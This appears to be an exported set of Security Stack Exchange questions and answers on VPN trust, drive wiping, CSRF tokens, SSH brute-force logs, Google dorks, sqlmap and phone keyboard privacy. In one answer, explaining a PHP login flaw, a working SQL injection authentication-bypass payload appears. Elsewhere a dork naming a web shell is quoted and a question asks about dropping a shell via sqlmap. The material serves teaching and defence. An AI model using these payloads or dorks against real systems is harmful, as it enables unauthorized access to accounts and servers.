<p>If for example, say that I want to connect to my online bank account, am I putting my credentials and packets are risk by having them sent over the VPN server? - I'm assuming that the banks login page is pretty secure already so by routing through a VPN server am I creating extra risk by routing over this third party?</p>

<p>The question boils down to; are there any situations where you wouldn't want to use a VPN, or is it always beneficial to security?</p>

<p>(Ignore cost / decreased network performance)</p>
","<p>Yes, it could be a disadvantage. What is boils down to is how much you trust the VPN provider.</p>

<p>For most secure protocols, using a VPN will be just as secure because your communications are encrypted by the protocol. If there was a MITM at the other end of the VPN connection they would not be able to do much (apart from a <a href=""http://en.wikipedia.org/wiki/Side-channel_attack"" rel=""nofollow noreferrer"">side channel attack</a>, which are usually pretty useless in isolation). Of course, this is assuming the protocols and software are secure, and cannot be not affected by the <a href=""http://en.wikipedia.org/wiki/FREAK"" rel=""nofollow noreferrer"">FREAK</a> attack or other downgrade attacks.</p>

<p>However, the web is different. The main issue is that the <a href=""http://en.wikipedia.org/wiki/Same-origin_policy"" rel=""nofollow noreferrer"">Same Origin Policy</a> does not designate a different origin for plain vs encrypted where cookies are concerned. A cookie set on <code>http://example.com</code> can be read by <code>https://example.com</code>. If there are any <a href=""https://stackoverflow.com/a/28875673/413180"">cookie handling vulnerabilities</a> on the site then the ""secure"" connection could be compromised. The <a href=""https://www.owasp.org/index.php/SecureFlag"" rel=""nofollow noreferrer"">Secure Flag</a> does not help here - this only prevents a plain HTTP connection from reading a cookie set over HTTPS, not the other way round. An example could be cookie poisoning like session fixation, or <a href=""https://security.stackexchange.com/a/44976/8340"">if there's an XSS vulnerability based on a cookie value that was assumed to only have been set via HTTPS</a>. These are really vulnerabilities on the sites themselves, however using an untrusted connection allows them to be exploited.</p>

<p>So if there is any doubt about the trust of your VPN provider, then disable plain HTTP from your browser and use the internet over HTTPS only. You can do this by setting an invalid proxy server for plain HTTP (e.g. <code>127.0.0.1:8</code>).</p>

<p>Of course, you should make sure you are using a secure protocol for your VPN connection too (e.g. not MS <a href=""https://www.schneier.com/pptp.html"" rel=""nofollow noreferrer"">PPTP</a>). Also, make sure you use iptables/Windows Firewall properly to prevent any incoming connections to your machine whilst connected to the VPN.</p>
","86855"
"What is the difference between ATA Secure Erase and Security Erase? How can I ensure they worked?","31343","","<p>I'd like to wipe a stack of drives (spinning and SSD) securely. I'm familiar with the ATA Secure Erase (SE) command via hdparm, but I'm not sure if I should use the Security Erase (SE+) command instead.</p>

<p>There is <a href=""https://security.stackexchange.com/questions/41676/ata-security-erase-on-ssd"">some evidence</a> that these commands don't work on all drives. How can I ensure the drive is really wiped, including reserve areas, reallocated sectors, and the like?</p>

<p>I'm planning to use a linux live CD (on USB). Ubuntu provides a workable live CD with which I can install hdparm, but is there a smaller live CD distro with updated software versions I should use instead?</p>

<p>So, in summary:</p>

<p>What are the pros and cons of SE versus SE+?</p>

<p>How can I ensure the drive was truly and thoroughly wiped?</p>

<p>Which linux distribution should I use?</p>
","<p>As quoted from <a href=""http://tinyapps.org/docs/wipe_drives_hdparm.html"">this page</a>:</p>

<blockquote>
  <p>Secure erase overwrites all user data areas with binary zeroes. Enhanced secure erase writes predetermined data patterns (set by the manufacturer) to all user data areas, including sectors that are no longer in use due to reallocation.</p>
</blockquote>

<p>This sentence makes sense only for spinning disks, and without encryption. On such a disk, at any time, there is a <em>logical</em> view of the disk as a huge sequence of numbered sectors; the ""secure erase"" is about overwriting all these sectors (and only these sectors) <em>once</em>, with zeros. The ""enhanced secure erase"" tries harder:</p>

<ul>
<li><p>It overwrites data several times with distinct bit patterns, to be sure that the data is thoroughly destroyed (whether this is really needed is subject to debate, but there is a lot of Tradition at work here).</p></li>
<li><p>It also overwrites sectors which are no longer used because they triggered an I/O error at some point, and were remapped (i.e. one of the spare sectors is used by the disk firmware when the computer reads or writes it).</p></li>
</ul>

<p>This is the <strong>intent</strong>. From the ATA specification point of view, there are two <em>commands</em>, and there is no real way to know how the erasure is implemented, or even whether it <em>is</em> actually implemented. Disks in the wild have been known to take some liberties with the specification at times (e.g. with data caching).</p>

<p>Another method for secure erasure, which is quite more efficient, is <em>encryption</em>:</p>

<ul>
<li>When it is first powered, the disk generates a random symmetric key <em>K</em> and keeps it in some reboot-resistant storage space (say, some EEPROM).</li>
<li>Every data read or write will be encrypted symmetrically, using <em>K</em> as key.</li>
<li>To implement a ""secure erase"", the disk just needs to forget <em>K</em> by generating a new one, and overwriting the previous one.</li>
</ul>

<p>This strategy is applicable to both spinning disks and SSD. In fact, when a SSD implements ""secure erase"", it MUST use the encryption mechanism, because the ""overwrite with zeros"" makes a lot less sense, given the behaviour of Flash cells and the heavy remapping / error correcting code layers used in SSD.</p>

<p>When a disk uses encryption, it will make no distinction between ""secure erase"" and ""enhanced secure erase""; it may implement both commands (at the ATA protocol level), but they will yield the same results. Note that, similarly, if a spinning disk claims to implement both modes as well, it may very well map both commands to the same action (hopefully, the ""enhanced"" one).</p>

<p>As described in <a href=""https://ata.wiki.kernel.org/index.php/ATA_Secure_Erase"">this page</a>, the <code>hdparm -I /dev/sdX</code> command will report something like this:</p>

<pre><code>Security: 
       Master password revision code = 65534
               supported
               enabled
       not     locked
       not     frozen
       not     expired: security count
               supported: enhanced erase
       Security level high
       2min for SECURITY ERASE UNIT. 2min for ENHANCED SECURITY ERASE UNIT.
</code></pre>

<p>2 minutes are not enough to overwrite the whole disk, so if that disk implements some actual ""secure erase"", it must be with the encryption mechanism. On the other hand, if <code>hdparm</code> reports this:</p>

<pre><code>       168min for SECURITY ERASE UNIT. 168min for ENHANCED SECURITY ERASE UNIT.
</code></pre>

<p>then we can conclude that:</p>

<ul>
<li>This disk performs a full data overwrite (that's the only reason why it would take almost three hours).</li>
<li>The ""secure erase"" and ""enhanced secure erase"" for that disk are probably identical.</li>
</ul>

<p>Depending on the disk size and normal performance for bulk I/O (can be measured with <code>hdparm -tT /dev/sdX</code>, one may even infer how many times the data is purportedly overwritten. For instance, if the disk above has size 1 terabyte and offers 100 MB/s write bandwidth, then 168 minutes are enough for a single overwrite, not the three or more passes that ""enhanced secure erase"" is supposed to entail.</p>

<p>(There is no difference between Linux distributions in that area; they all use the same <code>hdparm</code> utility.)</p>

<hr />

<p>One must note that the encryption-based secure erase really wipes the data only to the extent of the quality of the encryption and key generation. Disk encryption is not an easy task, since it must be secure and yet support random access. If the firmware simply implements <a href=""http://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Electronic_codebook_.28ECB.29"">ECB</a>, then identical blocks of plaintext will leak, as is usually illustrated by the penguin picture. Moreover, the <em>key generation</em> may be botched; it is possible that the underlying PRNG is quite weak, and the key would be amenable to exhaustive search.</p>

<p>These ""details"" are very important for security, and <em>you cannot test for them</em>. Therefore, if you want to be sure about the wiping out of the data, there are only two ways:</p>

<ol>
<li><p>The disk manufacturer gives you enough details about what the disk implements, and <em>guarantees</em> the wiping (preferably contractually).</p></li>
<li><p>You resort to good old physical destruction. Bring out the heavy duty shredders, the hot furnace and the cauldron of acid !</p></li>
</ol>
","64480"
"Can a hard drive be destroyed by drowning?","31289","","<p>These are some ways of <strong><a href=""https://security.stackexchange.com/questions/11313/how-do-you-destroy-an-old-hard-drive"">disposing of hard drives</a></strong>: Special firms, degaussing, hammering, pulling apart.</p>

<p>Can this be accomplished more quickly by drowning it? Fill a bucket with water, maybe add some aggressive cleaning products, throw the drive in, let it sit overnight, then dump it in the garbage.</p>

<p>Will the data be irretrievable after that?</p>
","<p>Special firms either degauss, destroy or melt the harddrives.</p>

<p>Harddrives are magnetic data. Magnetism can be destroyed by either:</p>

<ul>
<li><p>Degaussing (changing the magnetism)</p></li>
<li><p>Heating the drive (melting) (which destroys/changes the magnetism)</p></li>
<li><p>Hammering (shock) (shock damages magnetism somewhat, but the denting of the drive makes it very difficult to read the surface, as metal deforms, the surface area changes as well thus making it even more difficult to determine what is and isn't a sector)</p></li>
<li><p>Drilling (removes sectors altogether, physically changes the layout of the drive like hammering, generates a large localised amount of heat as well)</p></li>
<li><p>shooting (same as hammering, but more extreme)</p></li>
<li><p>Chemical corrosion (if the magnetic substrate is removed from the platters altogether, there's nothing left to recover)</p></li>
<li><p>Shredding, there's plenty of services that offer to shred your harddrive which leaves you with nothing but metal scraps, nothing to recover there.</p></li>
</ul>

<p>So, Would simply submerging the drive render it un-usable? No. Probably not to an experienced forensics or recovery team. What WILL kill the drive is corrosion of the platters, so it depends on what you add to the water, how long it stays in there, what the platters are made out of and how good the people trying to recover the data are.</p>
","36723"
"How does DuckDuckGo know my native language even though I am using a VPN in a country with a different language?","31246","","<p>I recently started using a VPN and I've felt more comfortable browsing the Internet. My VPN allows me to select another country through which my traffic is routed to make it appear I'm located in that particular country. ""What's my IP"" and similar services show my IP address located in that country as expected.</p>

<p>Search engines, however, are apparently not fooled. As I go to Google, for example, the front page is in my native language and it says my true country of origin at the bottom of the page. I was aware that this happens, as a VPN is not truly a means to make myself anonymous, and companies like Google can track my true location (I assume they do this for example by looking at the country specific top-level domain of the sites I visit?).</p>

<p>But what puzzles me though, is that other search engines, such as DuckDuckGo, which promise not to track their users in anyway, can also see my true country of origin. The front page of DDG also appears in my native language (not English).</p>

<p>So how is it that DDG and other ""non-tracking"" services see my true location without ""tracking"" me? Even when my IP address is located somewhere else, what gives my location away in such an obvious way that DDG can still claim not to track me?</p>
","<p>One possible explanation is that DuckDuckGo is using the headers that are sent in your request to determine their display.  For example, it is very common to use the Accept-Language header to determine in which language a webpage should be displayed.  This header is set by default in all modern browsers based on the language preference settings.  My browser, as an example, sends <code>Accept-Language: en-US</code> for all requests, letting the target site know that they should attempt to send back US based English if possible.  This does not require any sort of tracking to be used.</p>

<p>If you visit <a href=""https://duckduckgo.com/settings"" rel=""noreferrer"">https://duckduckgo.com/settings</a> you can see what the language settings are.  The default language is <code>Browser preferred language</code></p>
","174871"
"How to Insert data into a table with sqlmap using its sql-query command","31201","","<p>I'm using sqlmap on a test site and I wanted to modify some of the data inside of a table. Using the switch <code>--sql-query</code>. </p>

<ul>
<li><p>What is the correct syntax? </p>

<p>example: is it <code>--sql-query=""My_query_here""</code>?<br>
or maybe it's <code>--sql-query='myqueryhere'</code>?</p></li>
<li><p>How would I be able to modify multiple rows of data?</p>

<p>example: Say I wanted to replace all data with the words. Game Over</p></li>
<li><p>Is it possible to drop in a shell?</p></li>
</ul>
","<p>Most databases do not allow you to just insert data using SQL Injection (Unless of course you are already in an insert query and even then you usually can't control the table name).  You can't simply stack queries,  that is only allowed in Microsoft SQL Server, PostgreSQL and comic books.  You can use a sub-select or union select to access data from another table, and SQLMap is doing this behind the scenes. </p>

<p>SQLMap's real strength is in data exfiltration.  If you want something more complex,  like a multi-staged attack that gives you a shell,  then you need to <a href=""https://www.exploit-db.com/exploits/12510/"" rel=""nofollow"">write an exploit</a>.  Take off the training wheels and be man (or woman). </p>
","21298"
"How do I know if Google keyboard input is safe for use?","30811","","<p>I wanted to send out a message containing some non-Latin characters on my Android phone. When I tried to change the keyboard input method, a warning came out:</p>

<blockquote>
  <p><strong>ATTENTION</strong><br><br>
  This input method may be able to collect all the text that you type,
  including personal data like passwords and credit card numbers. It
  comes from the app [Google App/Google Pinyin/SwiftKey/etc]. Use this input method?</p>
</blockquote>

<p>Given that passwords are highly sensitive data, does it make any sense to give explicit consent to a possibility that Google <em>may</em> collect all my passwords and other personal data? Given the recent high profile NSA spying, how do I know if Google <em>does</em> indeed collect my passwords? If it is <em>not</em> collecting my personal data, why should such explicit consent be obtained from me?</p>

<p>Is there any workaround on an Android phone?</p>
","<p>Valid concern for both Android <em>and</em> iOS now that Apple has enabled third-party keyboard options there.</p>

<p>For Android, there are several security solutions with firewalls that enable you to cut off network access to particular applications, even if full network access is allowed in the permissions of those apps. Some require root access and I cannot personally attest to the efficacy of these applications, but several work with vanilla Android and are very well regarded. That said, ""well regarded"" doesn't mean secure—these apps pose the same threats as the ones you're trying to restrict. If it functions without root access, then—for reasons beyond my familiarity with the platform—they require full network access themselves. For apps that <em>do</em> require root access, they get root access which is even worse (and the act of rooting itself poses a significant security risk for that reason). I suppose it's a question of which entity you trust more: Google vs. a third-party developer. This can easily spiral into a debate over which entity would be most fearful of the law and bad press, but of course that is not sound as a sole consideration in the scope of information security; an attack prevented today is better than an attack today, justice served tomorrow.</p>

<p>Not the easiest task to remove Google connectivity from your phone altogether, and the keyboard isn't going to be the bottleneck in a hypothetical breach on their part. Notwithstanding, there are <em>keyboards</em> that require neither root access nor any network access at all, although the user experience may prove dissatisfying/insufficient for your purposes. You can try <a href=""https://play.google.com/store/apps/details?id=com.keymonk.latin"" rel=""noreferrer"">Keymonk Keyboard</a> which does not require any network access, but judging by the reviews it probably would not work that well for your purposes. One other option is to use something like <a href=""https://play.google.com/store/apps/details?id=com.lastpass.lpandroid&amp;hl=en"" rel=""noreferrer"">LastPass</a> or <a href=""https://play.google.com/store/apps/details?id=com.dashlane&amp;hl=en"" rel=""noreferrer"">DashLane</a> which I believe act as input methods like a keyboard does. Something brewing with <a href=""https://blog.agilebits.com/2014/11/22/avoiding-the-clipboard-with-1password-and-android-lollipop/"" rel=""noreferrer"">1Password</a> that is worth looking into: they will fill in passwords without use of the clipboard (clipboard sniffing is another valid concern of this same nature, perhaps an even greater threat at the moment). All of those apps I listed could have their own ulterior motives. </p>

<p>At the end of the day, <strong>trust</strong> is more or less a (sad) fact of comfortable smartphone use today, and it can be difficult to determine who deserves it/who will respect privacy/whose infringements are most benign.</p>
","81914"
"Is it safe to send clear usernames/passwords on a https connection to authenticate users?","30807","","<p>I'm setting up a home HTTP server which can send and receive JSON data to/from different clients (Android and iPhone apps).</p>

<p>I'd like to allow access only to certain users and I'm considering using a simple username/password mechanism, as setting up client certificates seems a bit of an overkill for this small project.</p>

<p>Of course I can't send clear passwords from the client to the server on plain HTTP, otherwise anyone with wireshark/tcpdump installed could read it. So, I'm thinking about the following mechanism:</p>

<ol>
<li>The HTTP server can be set up as HTTPS server</li>
<li>The server also has username/password database (passwords might be saved with bcrypt)</li>
<li>The client opens the HTTPS connection, it authenticates the server (so a server certificate is needed) and after exchanging the master key, the connection should be encrypted.</li>
<li>The client sends the username/password in clear to the server</li>
<li>The server runs bcrypt on the password and compares it with the one stored in the database</li>
</ol>

<p>Is there any problem with this kind of configuration? The password should be safe since it's sent on an encrypted connection.</p>
","<p>Yes, this is the standard practice.  Doing anything other than this offers minimal additional advantage, if any (and in some cases may harm the security).  As long as you verify a valid SSL connection to the correct server, then the password is protected on the wire and can only be read by the server.  You don't gain anything by disguising the password before sending it as the server can not trust the client.  </p>

<p>The only way that the information could get lost anyway is if the SSL connection was compromised and if the SSL connection was somehow compromised, the ""disguised"" token would still be all that is needed to access the account, so it does no good to protect the password further.  (It does arguably provide a slight protection if they have used the same password on multiple accounts, but if they are doing that, they aren't particularly security conscious to begin with.)</p>

<p>As MyFreeWeb pointed out, there are also some elaborate systems that can use a challenge response to ensure that the password is held by the client, but these are really elaborate and not widely used at all.  They also still don't provide a whole lot of added advantage as they only protect the password from being compromised on an actively hacked server.</p>
","64639"
"What is the correct way to implement anti-CSRF form tokens?","30764","","<p>I am fully aware of <a href=""http://en.wikipedia.org/wiki/Cross-site_request_forgery"">CSRF</a> and have already implemented some safe forms, but I have never been happy with the results yet.</p>

<p>I've created tokens as a md5 of username, form info and a <a href=""http://en.wikipedia.org/wiki/Salt_%28cryptography%29"">salt</a> and stored it in a session. This has a problem with tabbed browsing (can be fixed by keeping an array of active hashes) and with timing. I would like my hashes to work only for eg. 10 minutes, but how do I put a time-related variable in the hash?</p>

<p>Can anybody point me to a good resource describing how to make CSRF security properly?</p>
","<p>The best way to build CSRF protection properly:</p>

<blockquote>
  <p>Don't.</p>
</blockquote>

<p>Most common frameworks have this protection already built in (ASP.NET, Struts, Ruby I think), or there are existing libraries that have already been vetted. (e.g. <a href=""http://www.owasp.org/index.php/Category%3aOWASP_CSRFGuard_Project"">OWASP's CSRFGuard</a>).   </p>

<p>Another option, depending on your context, is to enforce reauthentication of the user, but only for specific, sensitive operations.  </p>

<hr>

<p>As per your comments, if you need to implement this yourself, your solution is not too bad, but I would simplify it.<br>
You can generate a crypto-random nonce (long enough), store that in session memory, and change it every X minutes (you store the expiry time in session too). In each form, you include the nonce in a hidden form field, and compare that value when the form is posted.<br>
If the form token matches, you're clear. If not, you can accept e.g. the previous token as well, to handle the edge cases. </p>

<p>Though I must say that I've seen too many failed attempts at implementing this by oneself, to really recommend this path. You're still better off finding a minimal package to do this for you. </p>
","167"
"When the use of a AntiForgeryToken is not required /needed?","30633","","<p>I'm running a rather large site with thousands of visits every day, and a rather large userbase.</p>

<p>Since I started migrating to MVC 3, I've been putting the AntiForgeryToken in a number of forms, that modify protected data etc.</p>

<p>Some other forms, like the login / registration also use the AntiForgeryToken now, but I'm becoming dubious about their need there in the first place, for a couple reasons...</p>

<p>The login form requires the poster to know the correct credentials. I can't really think of any way an csrf attack would benefit here. Especially if I check that the request came from the same host (checking the Referrer header)
The AntiForgeryToken token generates different values every time the page is loaded.. If I have two tabs open with the login page, and then try to post them, the first one will successfully load. The second will fail with a AntiForgeryTokenException (first load both pages, then try to post them). With more secure pages - this is obviously a necessary evil, with the login pages - seems like overkill, and just asking for trouble :S
There are possibly other reasons why would one use/not use the token in their forms.. Am I correct in assuming that using the token in every post form is bad / overkill, and if so - what kind of forms would benefit from it, and which ones would definitely NOT benefit?</p>

<p>P.S. This question <a href=""https://stackoverflow.com/questions/4757890/when-the-use-of-a-antiforgerytoken-is-not-required-needed"">is also asked</a> on StackOverflow, but I'm not entirely convinced.. I thought I'd ask it here, for more <em>security</em> coverage</p>
","<p>Yes, it is important to include anti-forgery tokens for login pages.</p>

<p>Why?  Because of the potential for ""login CSRF"" attacks.  In a login CSRF attack, the attacker logs the victim into the target site with the attacker's account.  Consider, for instance, an attack on Alice, who is a user of Paypal, by an evil attacker Evelyn.  If Paypal didn't protect its login pages from CSRF attacks (e.g., with an anti-forgery token), then the attacker can silently log Alice's browser into Evelyn's account on Paypal.  Alice gets taken to the Paypal web site, and Alice is logged in, but logged in as Evelyn.  Suppose Alice then clicks on the page to link her credit card to her Paypal account, and enters her credit card number.  Alice thinks she is linking her credit card to her Paypal account, but actually she has linked it to Evelyn's account.  Now Evelyn can buy stuff, and have it charged to Alice's credit card.  Oops.  This is subtle and a bit obscure, but serious enough that you should include anti-forgery tokens for the form action target used to log in.  See <a href=""http://www.adambarth.com/papers/2008/barth-jackson-mitchell-b.pdf"">this paper</a> for more details and some real-world examples of such vulnerabilities.</p>

<p>When is it OK to leave off the anti-forgery token?  In general, if the target is a URL, and accessing that URL has no side effects, then you don't need to include anti-forgery token in that URL.</p>

<p>The rough rule of thumb is: include an anti-forgery token in all POST requests, but you don't need it for GET requests.  However, this rough rule of thumb is a very crude approximation.  It makes the assumption that GET requests will all be side-effect-free.  In a well-designed web application, that should hopefully be the case, but in practice, sometimes web application designers don't follow that guideline and implement GET handlers that have a side effect (this is a bad idea, but it's not uncommon).  That's why I suggest a guideline based upon whether the request will have a side effect to the state of the web application or not, instead of based on GET vs POST.</p>
","2126"
"What's the purpose? Strange login attemps ""sshd[***] Received disconnect from **.**.**.**: 11: Bye Bye [preauth]""","30584","","<p>I've seen something like:</p>

<pre><code>sshd[***]: Invalid user oracle from **.**.**.**                          // 1st line
sshd[***]: input_userauth_request: invalid user oracle [preauth]         // 2nd line
sshd[***]: Received disconnect from **.**.**.**: 11: Bye Bye [preauth]   // 3rd line
</code></pre>

<p>and I know that's someone tries to log into my server, but what does it mean when there's only the 3rd line repeating over and over again for, like, 3000+ times?</p>

<p>I mean, like this (there's no <code>Invalid user</code> or <code>input_userauth_request</code>):</p>

<pre><code>sshd[***]: Received disconnect from **.**.**.**: 11: Bye Bye [preauth]
sshd[***]: Received disconnect from **.**.**.**: 11: Bye Bye [preauth]
sshd[***]: Received disconnect from **.**.**.**: 11: Bye Bye [preauth]
</code></pre>

<p>What's the <em>purpose</em> of doing so, what's he trying to do since it's <em>""disconnect""</em> instead of trying to login?</p>
","<p>This error rises from a fatal error in the authentication process (see <code>monitor.c</code> of OpenSSH versions 6.1p1+).</p>

<p>It is likely that the attacker is using some custom code to brute-force the server which is ending up in malformed authentication requests being sent, resulting in the server killing the connection. So from the code it appears they are in fact trying to login, but the server doesn't like how they're attempting that.</p>

<p>As such, these log entries aren't anything to worry about unless you think you are likely to be a targeted victim for any reason (in which case you should be taking extra precautions such as refusing password-based logins).</p>

<p>In any case, I suggest you install the simple <code>fail2ban</code> program if you haven't already which will significantly hinder cookie-cutter brute-force authentication attempts.</p>
","44254"
"Using google dorks for a specific site?","30527","","<p>I need to see if a site I am testing is vulnerable to any of the multiple Google dorks that are available at sites like <a href=""http://www.exploit-db.com/google-dorks/"">this</a> and <a href=""http://www.hackersforcharity.org/ghdb/"">this</a>. 
Traditionally, one uses a 'dork' by searching ""Index of/""+c99.php"""" in Google and getting a whole stack of results. </p>

<p>How can I search for <strong>all</strong> the dorks for my <strong>specific site</strong> quickly and easily? Is it even possible? </p>

<p>Edit: For clarification, I have access to, and use a number of commercial paid applications to do web-app scanning. However, i'm having issues with the site using a WAF and limiting my connections which is <strong>greatly</strong> slowing things down. As a result, I'm more looking for a program that queries Google rather than scanning the site.</p>
","<p><a href=""http://w3.cultdeadcow.com/cms/2008/02/goolag-scanner.html"" rel=""nofollow"">Goolag Scanner</a> by CDC works for what I need and I can update the XML files with newer dorks by editing the XML file in the file %baseDir%\Dorkdata\gdorks.xml </p>
","44674"
"Is there any SQL injection for this PHP login example?","30460","","<p>I want to write a login form, and I got one example from the web.
I want to know, if there is any SQL injection for this code? If there is, what could the exploit's web form entry look like?</p>

<p>This is my form:</p>

<pre><code>&lt;form method=""post"" action=""""&gt;
    &lt;dt class=""title""&gt;&lt;label for=""username""&gt;name:&lt;/label&gt;&lt;/dt&gt;
    &lt;dt&gt;&lt;input type=""text"" name=""username"" id=""username""  size=""50""&gt;&lt;/dt&gt;
    &lt;dt class=""title""&gt;&lt;label for=""password""&gt;pass:&lt;/label&gt;&lt;/dt&gt;
    &lt;dt&gt;&lt;input type=""password"" name=""password"" id=""password"" size=""50""&gt;&lt;/dt&gt;
    &lt;input type=""hidden"" name=""post"" value=""1"" /&gt;
    &lt;input type=""submit"" name=""submit"" value=""submit"" class=""button""&gt;
&lt;/form&gt;
</code></pre>

<p>and this is my check:</p>

<pre><code>if (($post[username]) AND ($post[password])) 
    {
        $query = 'SELECT * FROM `config` WHERE `config_admin_username`=""'.$post[username].'"" AND `config_admin_password`=MD5(""'.$post[password].'"") LIMIT 1';
        $sql_user_check = $db-&gt;fetch($query);
        if (!$sql_user_check) { 
            $error .= ""Wrong Entry.&lt;br /&gt;"";
        } else {
            $_SESSION[admin] = 1;
            header(""Location:index.php"");
            exit;
        }
    }
</code></pre>

<p>I'm using phpmyadmin 3.2.0.1 on wamp 2.0i</p>
","<p>You've come to the right place. Welcome to <a href=""https://security.stackexchange.com/"">IT security</a>!</p>

<blockquote>
  <p>is there any sql injection for this code?</p>
</blockquote>

<p><strong>Yes</strong></p>

<blockquote>
  <p>if there is what is that Entry?</p>
</blockquote>

<pre><code>username: [any username from your website]"" /*
password: sux0r"")*/ OR (""1""=""1
</code></pre>

<p>It will run this query:</p>

<pre><code>SELECT * FROM `config` 
WHERE `config_admin_username`=""[any username from your website]"" /* 
      AND `config_admin_password`=MD5(""sux0r"")*/ OR (""1""=""1"") LIMIT 1'
</code></pre>

<p>If we remove the commented-out parts that SQL engine won't parse, this results in:</p>

<pre><code>SELECT * FROM `config` 
WHERE `config_admin_username`=""[any username from your website]"" OR (""1""=""1"") LIMIT 1'
</code></pre>

<p>SQL query will be parsed up till the commented out part (I used the <code>/*</code> and <code>*/</code> start-comment/end-comment pair in my example and assuming you're using <a href=""https://dev.mysql.com/doc/refman/5.1/en/comments.html"" rel=""nofollow noreferrer"">MySQL</a>, but that can be different depending on RDBMS used), effectively disabling your password check altogether. Even if in-SQL commenting is not supported, or disabled, the options to exploit your login are really limitless. I won't even go into your choice of MD5 as a password hashing algorithm, as you have a lot of other things to consider first. It clearly isn't the recommended hash algorithm for password hashing though.</p>

<p>You've done good to have come to this website and that you're asking yourself questions regarding your code safety. Congratulations, you're already a better PHP programmer than most that never got so far are! Now, it's up to you what you'll learn from already existing questions and answers here. Some tags to consider are <a href=""/questions/tagged/php"" class=""post-tag"" title=""show questions tagged &#39;php&#39;"" rel=""tag"">php</a>, <a href=""/questions/tagged/authentication"" class=""post-tag"" title=""show questions tagged &#39;authentication&#39;"" rel=""tag"">authentication</a>, <a href=""/questions/tagged/web-application"" class=""post-tag"" title=""show questions tagged &#39;web-application&#39;"" rel=""tag"">web-application</a>, <a href=""/questions/tagged/hash"" class=""post-tag"" title=""show questions tagged &#39;hash&#39;"" rel=""tag"">hash</a>,...</p>
","34659"
"Landlord will be watching my data traffic, as mentioned in the lease agreement","30394","","<p>I am moving to Germany, and in the contract I signed I had to accept that all my data traffic can/will be checked by the apartment owner. The contract states:</p>

<blockquote>
  <p>Flatrate, aber hinter 30GB Tarif priorisiert, aslo etwas langsamer</p>
  
  <p>Ja ich weiss, daß meine Daten überprüft werden. </p>
</blockquote>

<p>Which translates to:</p>

<blockquote>
  <p>That after using an amount of 30GB data, the speed can/will be slower.</p>
</blockquote>

<p>And the critical:</p>

<blockquote>
  <p><strong>Yes, I know that my data is checked/investigated</strong></p>
</blockquote>

<p>Later in the contract one can read the following</p>

<blockquote>
  <p>Im Rahmen der gesetzlichen Bestimmungen (Anti-Terror-Gesetze und TKG) kann das Protokollieren der Daten erfolgen. Im Mietpreis ist eine FLAT-Rate enthalten, dabei können jedoch einzelne Ports gesperrt sein oder bestimmte Verbindungen mittels Traffic-Shapping bevorzugt oder verlangsamt werden. Bestimmte Geschwindigkeiten werden nicht zugesichert. Die Verbindung funktioniert nur, wenn DHCP eingeschaltet ist (z.B. bei Windows IP-adresse automatisch beziehen). </p>
</blockquote>

<p>Which translates to:</p>

<blockquote>
  <p>In accordance with statutory requirements (anti-terror laws and TKG)
  to log the data can take place. a FLAT rate is in the rental amount,
  but it can individual ports to be blocked or certain compounds by
  traffic Shapping preferred or slowed. Certain speeds are not
  guaranteed. The connection works only if DHCP is enabled (eg
  automatically when Windows IP address relate).</p>
</blockquote>

<p>Since I really needed this apartment I was forced to accept this. But not anywhere does the contract says that I can not make it difficult for the landlord to check my traffic.</p>

<p>So my question is: would it be possible to make it difficult for the person watching my data traffic to see what I am actually doing on the internet? As you probably can tell, I do not know alot in this field. </p>

<p>Internet is provided via LAN, but I am going to use a D-link dir-635 router. And I am running Linux Mint. </p>

<p>I am not familiar with the prices of 4g/LTE in Germany, so I can not say if that is an option yet. I do not think I can get my own internet installed, and since the internet is provided in the rent (whether I want it to or not) it feels redundant to install a personal internet. </p>
","<p>FINAL (hopefully) UPDATE: Well after all the very interesting and valuable discussion, it seems to me as though initial thoughts were correct. From the updated question, I would say that the restrictions are pretty standard for Germany.</p>

<p>My recommendation is that you ignore the noise and the concerns and simply make use of the service. Unless you have some very specific security needs that you haven't shared, using HTTPS wherever possible (which is best practice anyway) is sufficient. </p>

<p>In any case, the other options discussed would all add overheads to your traffic which would use up your 30GB even sooner and slow things down.</p>

<hr>

<p>There are several things you can do. Provided that the terms and conditions of use are OK with them.</p>

<p>You don't say what country you are in but you might want to get the terms of use checked by a lawyer since some terms may not be legally permissible anyway.</p>

<p>Here are four of the main ways you can protect your Internet traffic from the prying intermediate.</p>

<ol>
<li><p>Make sure you always only connect to HTTPS sites</p>

<p>When you use HTTPS sites, the traffic is encrypted between you and the endpoint. Your landlords infrastructure will not be able to do more than examine the destination IP address, port and DNS. In particular, things like banking and health sites will remain secure.</p></li>
<li><p>Use a VPN</p>

<p>A VPN in this case is a 3rd party service that encrypts ALL of the traffic (not just web traffic as in 1) between your machine and the VPN host. This prevents any inspection of the traffic at all and it will appear as though you only talk to the VPN destination.</p>

<p>Unfortunately, it is possible that common VPN end-points might be blocked or even a smart security system used that will dynamically identify VPN traffic and ban it. Check the terms of use from your landlord carefully.</p></li>
<li><p>TOR</p>

<p>TOR is a way to obfuscate connections across the Internet and is often associated with ""the dark web"". However, it has legitimate uses as well. Unfortunately, it can add quite an overhead to traffic and may be unacceptably slow. Typically TOR will be used for web browsing, other network traffic would not be affected.</p></li>
<li><p>Use the Mobile network</p>

<p>If you are fortunate enough to live in an area with a) good (4G/LTE) mobile coverage and b) an affordable data tariff. Then using a 4G/LTE mobile router may be an option. You can get some staggeringly good data rates.</p>

<p>Don't expect to be free of restrictions though. Many tariffs don't allow device sharing, you'll need a special tariff for mobile data. You might not be allowed to use all services (like VPN's) and you are more likely to have national-level restrictions applied such as the <a href=""https://en.wikipedia.org/wiki/Internet_censorship_in_the_United_Kingdom"">UK's national ""firewall""</a>.</p></li>
</ol>

<hr>

<p>It goes without saying (so I will say it anyway!) that you should ensure that you are staying within the letter of the laws of your locality &amp; the legitimate terms of use of the landlords network. However, none of the above are illegal in most countries (well in most Western countries anyway) as long as you are not using them to do illegal activities. TOR and VPN's may possibly be illegal or at least get you unwelcome attention in certain countries.</p>

<hr>

<p>UPDATE: Without question, the most security would be provided by a VPN. </p>

<p>However, that will only be useful if the landlords network allows VPN traffic. In addition, VPN's also carry an overhead so things like real-time traffic (Skype voice/video for example) and online gaming would be impacted quite significantly.</p>

<p>In addition, VPN's will normally come at a cost though there are some discount codes around that might help.</p>

<p>It is possible to set up your own VPN if you have a server on the Internet to run it on. Most VPS hosts wont allow it but some will as long as you keep it private.</p>

<p>The real question is - do you really need to be bothered? That's why I mentioned HTTPS first. Since this protects your information to sites and since all decent online services already use HTTPS, you might find that this is a storm in a teacup.</p>

<hr>

